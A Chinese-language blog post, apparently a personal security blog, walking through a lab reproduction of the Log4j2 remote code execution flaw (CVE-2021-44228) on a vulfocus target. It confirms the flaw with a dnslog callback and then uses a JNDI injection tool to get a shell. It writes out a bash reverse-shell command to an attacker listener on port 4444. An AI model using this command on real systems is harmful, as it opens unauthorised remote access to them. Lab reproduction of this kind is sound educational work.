@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Log4j2远程命令执行漏洞复现-CVE-2021-44228 | Cloud's blog</title><meta name="keywords" content="Log4j2远程命令执行漏洞复现"><meta name="author" content="CloudRoam"><meta name="copyright" content="CloudRoam"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x01 前言近期Apache Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。0x02 漏洞描述Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2远程命令执行漏洞复现-CVE-2021-44228">
+<meta property="og:url" content="http://example.com/2021/12/14/vulfocus-log4j2/index.html">
+<meta property="og:site_name" content="Cloud&#39;s blog">
+<meta property="og:description" content="0x01 前言近期Apache Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。0x02 漏洞描述Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s4.ax1x.com/2021/12/15/TpIt61.jpg">
+<meta property="article:published_time" content="2021-12-14T13:42:39.000Z">
+<meta property="article:modified_time" content="2021-12-15T15:14:15.681Z">
+<meta property="article:author" content="CloudRoam">
+<meta property="article:tag" content="Log4j2远程命令执行漏洞复现">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s4.ax1x.com/2021/12/15/TpIt61.jpg"><link rel="shortcut icon" href="/img/%E6%B0%B4%E6%BB%B4.jpg"><link rel="canonical" href="http://example.com/2021/12/14/vulfocus-log4j2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Log4j2远程命令执行漏洞复现-CVE-2021-44228',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-12-15 23:14:15'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://z3.ax1x.com/2021/12/02/oYuzLQ.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://z3.ax1x.com/2021/12/02/oYQS5n.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Cloud's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Log4j2远程命令执行漏洞复现-CVE-2021-44228</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-12-14T13:42:39.000Z" title="发表于 2021-12-14 21:42:39">2021-12-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-12-15T15:14:15.681Z" title="更新于 2021-12-15 23:14:15">2021-12-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E8%91%97%E5%90%8D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">著名漏洞复现</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Log4j2远程命令执行漏洞复现-CVE-2021-44228"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><h3 id="近期Apache-Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。"><a href="#近期Apache-Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。" class="headerlink" title="近期Apache Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。"></a>近期Apache Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。</h3><h1 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h1><p>Apache Log4j2是一款优秀的Java日志框架。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。2021年12月10日，阿里云安全团队发现Apache Log4j 2.15.0-rc1版本存在漏洞绕过，请及时更新至Apache Log4j 2.15.0最新版本。</p>
+<h1 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h1><p>本文采用本地搭建vulfocus漏洞平台的方式进行测试，如果不感兴趣可自行跳过本小节。</p>
+<p>当然可以使用在线<a target="_blank" rel="noopener" href="http://vulfocus.fofa.so/#/login?redirect=%2Fdashboard">vulfocus</a>。</p>
+<p>注意：使用在线vulfocus利用此漏洞时，如果想要反弹shell，则需要一个公网ip。</p>
+<ul>
+<li><p>首先在虚拟机中拉取vulfocus镜像，作者自己的机器为ubuntu 20.04.3 LTS。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxrsld"><img src="https://s4.ax1x.com/2021/12/14/oxrsld.png" alt="oxrsld.png"></a></p>
+</li>
+<li><p>输入<strong>docker pull vulfocus/vulfocus:latest</strong>等待镜像拉取完成。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxsXDI"><img src="https://s4.ax1x.com/2021/12/14/oxsXDI.png" alt="oxsXDI.png"></a></p>
+</li>
+<li><p>启动镜像，输入<strong>docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock  -e VUL_IP=192.168.xx.xx vulfocus/vulfocus</strong>，这里的VUL_IP输入自己本机地址，如果本机80端口被占用请修改为物理机可用端口（修改左边的80）。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxciBn"><img src="https://s4.ax1x.com/2021/12/14/oxciBn.png" alt="oxciBn.png"></a></p>
+</li>
+<li><p>启动成功后，在浏览器输入本机地址加对应端口号。查看是否可以进入vulfocus登录界面。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxcUjH"><img src="https://s4.ax1x.com/2021/12/14/oxcUjH.png" alt="oxcUjH.png"></a></p>
+</li>
+<li><p>默认账号密码为admin/admin。登录。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxHHTU"><img src="https://s4.ax1x.com/2021/12/14/oxHHTU.png" alt="oxHHTU.png"></a></p>
+</li>
+<li><p>点击镜像管理查询漏洞log4j2，如果没有可以点击一键同步，不过时间很长，我们可以注册登录在线vulfocus查看镜像信息并拉取镜像到本地。首先查看镜像名称。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxb44e"><img src="https://s4.ax1x.com/2021/12/14/oxb44e.png" alt="oxb44e.png"></a></p>
+</li>
+<li><p>ubuntu里输入docker pull vulfocus/log4j2-rce-2021-12-09:latest，拉取漏洞镜像到本地。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxqqz9"><img src="https://s4.ax1x.com/2021/12/14/oxqqz9.png" alt="oxqqz9.png"></a></p>
+</li>
+<li><p>在本地vulfocus里选择本地导入导入之前拉取到本地的镜像。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxOr9g"><img src="https://s4.ax1x.com/2021/12/15/oxOr9g.png" alt="oxOr9g.png"></a></p>
+</li>
+<li><p>然后到首页里去查找漏洞并启动。之后浏览器访问相应地址端口即可查看到环境。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxXn2Q"><img src="https://s4.ax1x.com/2021/12/15/oxXn2Q.png" alt="oxXn2Q.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/oxXN24"><img src="https://s4.ax1x.com/2021/12/15/oxXN24.png" alt="oxXN24.png"></a></p>
+<h1 id="0x04-漏洞复现"><a href="#0x04-漏洞复现" class="headerlink" title="0x04 漏洞复现"></a>0x04 漏洞复现</h1><h3 id="vulfocus提供的漏洞环境利用方法是通过post方式访问http-xxxxx-hello-post参数为：payload-xxxxx。这里的xxxxx就表示我们需要填入的数据，这里我们可以填入漏洞利用。"><a href="#vulfocus提供的漏洞环境利用方法是通过post方式访问http-xxxxx-hello-post参数为：payload-xxxxx。这里的xxxxx就表示我们需要填入的数据，这里我们可以填入漏洞利用。" class="headerlink" title="vulfocus提供的漏洞环境利用方法是通过post方式访问http://xxxxx/hello post参数为：payload=xxxxx。这里的xxxxx就表示我们需要填入的数据，这里我们可以填入漏洞利用。"></a>vulfocus提供的漏洞环境利用方法是通过post方式访问<a target="_blank" rel="noopener" href="http://xxxxx/hello">http://xxxxx/hello</a> post参数为：payload=xxxxx。这里的xxxxx就表示我们需要填入的数据，这里我们可以填入漏洞利用。</h3></li>
+<li><p>打开burpsuite开始抓包，抓取到包并发送到repeater。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Tp2osU"><img src="https://s4.ax1x.com/2021/12/15/Tp2osU.png" alt="Tp2osU.png"></a></p>
+</li>
+<li><p>在Repeader下右击将get方式改变为<strong>post方式</strong>并且修改http包两处，如下图中红框标记处。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TpRbX8"><img src="https://s4.ax1x.com/2021/12/15/TpRbX8.png" alt="TpRbX8.png"></a></p>
+</li>
+<li><p>上图中的马赛克区域就是我们需要填写的恶意数据，这里我们先利用dnslog进行抓包测试，查看是否有相关漏洞。打开<a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog</a>申请一个域名。这里测试的环境为<strong>在线vulfocus</strong>，如下图所示在填入恶意链接后，有数据发送到了dnslog上，说明此漏洞存在于这个网站。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TprOiV"><img src="https://s4.ax1x.com/2021/12/15/TprOiV.png" alt="TprOiV.png"></a></p>
+</li>
+<li><p>好，既然存在此漏洞，我们试着利用rmi服务来注入我们的恶意命令，这里作者希望反弹一个shell回来。作者首先使用到一个开源工具，这个工具专门测试jndi漏洞，<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">点击此</a>获取工具链接。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Tpy1B9"><img src="https://s4.ax1x.com/2021/12/15/Tpy1B9.png" alt="Tpy1B9.png"></a></p>
+</li>
+<li><p>工具如何使用见github页面，这里我们就直接使用起来，首先这个工具需要一个命令让被攻击机器执行，这里我们打算使用bash反弹shell，需要执行的反弹shell命令内容如下：</p>
+<p><strong>bash -c {echo,xxxxxxxxxxxxxxxxxx}|{base64,-d}|{bash,-i}<strong>，这里的xxxxxxxxxx需要填入</strong>base64</strong>后的反弹shell命令，这里需要利用linux上的base64软件制作。</p>
+<p>比如制作的命令为：<strong>bash -i &gt;&amp; /dev/tcp/192.168.xx.xx/4444 0&gt;&amp;1</strong>，这表示将shell反弹到192.168.xx.xx机器的4444端口，这里读者可以根据自己情况进行配置。</p>
+<p>作者最终执行的命令如下图，并且的得到rmi服务链接。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TpWKc6"><img src="https://s4.ax1x.com/2021/12/15/TpWKc6.png" alt="TpWKc6.png"></a></p>
+<p>作者这里使用了红框中的链接才反弹成功。</p>
+</li>
+<li><p>之后我们将此链接填入http包中，如下图所示。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TpWgCn"><img src="https://s4.ax1x.com/2021/12/15/TpWgCn.png" alt="TpWgCn.png"></a></p>
+</li>
+<li><p>在攻击机器上开启监听，点击发送，得到如下回复包。即可表示注入成功。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Tpf95d"><img src="https://s4.ax1x.com/2021/12/15/Tpf95d.png" alt="Tpf95d.png"></a></p>
+</li>
+<li><p>查看监听，发现已经获取到反弹shell。</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/Tpf1x0"><img src="https://s4.ax1x.com/2021/12/15/Tpf1x0.png" alt="Tpf1x0.png"></a></p>
+</li>
+</ul>
+<p>到此，复现完成。</p>
+<p>作者复现此漏洞借鉴一位优秀的同事，同事<a target="_blank" rel="noopener" href="https://gard3nia.github.io/">博客点此</a>。感谢。</p>
+<p>关于此漏洞的触发原理，作者能力有限，只是略知一二，或许各位读者早已了然于胸，作者在此羡慕不已。但作者本着工匠精神，在参考链接中贴出了网上几篇优秀的文章，有兴趣着可以查看参考链接进行阅读。</p>
+<h1 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h1><ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/262668#h2-8">Apache Log4j2 远程代码执行漏洞分析</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10649">Apache Log4j2从RCE到RC1绕过</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/puzhiwei/p/15677816.html">令无数程序员加班的 Log4j2 远程执行漏洞复现 </a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/confidant/p/15452115.html">Docker安装和Vulfocus靶场搭建</a></p>
+</li>
+</ul>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">CloudRoam</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/12/14/vulfocus-log4j2/">http://example.com/2021/12/14/vulfocus-log4j2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Cloud's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">Log4j2远程命令执行漏洞复现</a></div><div class="post_share"><div class="social-share" data-image="https://s4.ax1x.com/2021/12/15/TpIt61.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2021/12/08/%E5%8D%9A%E4%B8%BB%E8%87%AA%E5%B7%B1%E9%9A%8F%E7%AC%941-%E9%9D%92%E5%B1%B1/"><img class="next-cover" src="https://s4.ax1x.com/2021/12/08/oWGYQJ.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">博主随笔文学1-青山</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://z3.ax1x.com/2021/12/02/oYuzLQ.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">CloudRoam</div><div class="author-info__description">DX-3906</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%91%E6%9C%9FApache-Log4j2%E8%A2%AB%E6%9A%B4%E9%9C%B2%E4%BA%86%E4%B8%80%E4%B8%AA%E4%B8%A5%E9%87%8D%E7%9A%84%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2021-44228%EF%BC%89%EF%BC%8C%E6%9C%89%E4%B8%A5%E9%87%8D%E7%9A%84%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9%E3%80%82"><span class="toc-number">1.0.1.</span> <span class="toc-text">近期Apache Log4j2被暴露了一个严重的远程代码执行安全漏洞（CVE-2021-44228），有严重的安全风险。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">0x02 漏洞描述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">3.</span> <span class="toc-text">0x03 环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">4.</span> <span class="toc-text">0x04 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vulfocus%E6%8F%90%E4%BE%9B%E7%9A%84%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E6%98%AF%E9%80%9A%E8%BF%87post%E6%96%B9%E5%BC%8F%E8%AE%BF%E9%97%AEhttp-xxxxx-hello-post%E5%8F%82%E6%95%B0%E4%B8%BA%EF%BC%9Apayload-xxxxx%E3%80%82%E8%BF%99%E9%87%8C%E7%9A%84xxxxx%E5%B0%B1%E8%A1%A8%E7%A4%BA%E6%88%91%E4%BB%AC%E9%9C%80%E8%A6%81%E5%A1%AB%E5%85%A5%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%A1%AB%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E3%80%82"><span class="toc-number">4.0.1.</span> <span class="toc-text">vulfocus提供的漏洞环境利用方法是通过post方式访问http:&#x2F;&#x2F;xxxxx&#x2F;hello post参数为：payload&#x3D;xxxxx。这里的xxxxx就表示我们需要填入的数据，这里我们可以填入漏洞利用。</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考链接</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/14/vulfocus-log4j2/" title="Log4j2远程命令执行漏洞复现-CVE-2021-44228"><img src="https://s4.ax1x.com/2021/12/15/TpIt61.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Log4j2远程命令执行漏洞复现-CVE-2021-44228"/></a><div class="content"><a class="title" href="/2021/12/14/vulfocus-log4j2/" title="Log4j2远程命令执行漏洞复现-CVE-2021-44228">Log4j2远程命令执行漏洞复现-CVE-2021-44228</a><time datetime="2021-12-14T13:42:39.000Z" title="发表于 2021-12-14 21:42:39">2021-12-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/08/%E5%8D%9A%E4%B8%BB%E8%87%AA%E5%B7%B1%E9%9A%8F%E7%AC%941-%E9%9D%92%E5%B1%B1/" title="博主随笔文学1-青山"><img src="https://s4.ax1x.com/2021/12/08/oWGYQJ.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="博主随笔文学1-青山"/></a><div class="content"><a class="title" href="/2021/12/08/%E5%8D%9A%E4%B8%BB%E8%87%AA%E5%B7%B1%E9%9A%8F%E7%AC%941-%E9%9D%92%E5%B1%B1/" title="博主随笔文学1-青山">博主随笔文学1-青山</a><time datetime="2021-12-08T14:50:57.000Z" title="发表于 2021-12-08 22:50:57">2021-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/08/oscp-linux-%E6%8F%90%E6%9D%83-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A12/" title="Linux_PE_定时任务之curl提权"><img src="https://s4.ax1x.com/2021/12/06/oywZ34.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux_PE_定时任务之curl提权"/></a><div class="content"><a class="title" href="/2021/12/08/oscp-linux-%E6%8F%90%E6%9D%83-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A12/" title="Linux_PE_定时任务之curl提权">Linux_PE_定时任务之curl提权</a><time datetime="2021-12-08T13:04:06.000Z" title="发表于 2021-12-08 21:04:06">2021-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/oscp-linux-%E6%8F%90%E6%9D%83-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A11/" title="Linux_PE_定时任务之配置777权限提权"><img src="https://s4.ax1x.com/2021/12/06/oywZ34.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux_PE_定时任务之配置777权限提权"/></a><div class="content"><a class="title" href="/2021/12/06/oscp-linux-%E6%8F%90%E6%9D%83-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A11/" title="Linux_PE_定时任务之配置777权限提权">Linux_PE_定时任务之配置777权限提权</a><time datetime="2021-12-06T13:58:21.000Z" title="发表于 2021-12-06 21:58:21">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/" title="vulhub-ActiveMQ-cve-2016-3088漏洞复现！"><img src="https://z3.ax1x.com/2021/12/02/oYQHo9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulhub-ActiveMQ-cve-2016-3088漏洞复现！"/></a><div class="content"><a class="title" href="/2021/11/28/vulhub-ActiveMQ-cve-2016-3088/" title="vulhub-ActiveMQ-cve-2016-3088漏洞复现！">vulhub-ActiveMQ-cve-2016-3088漏洞复现！</a><time datetime="2021-11-28T10:57:13.000Z" title="发表于 2021-11-28 18:57:13">2021-11-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By CloudRoam</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script 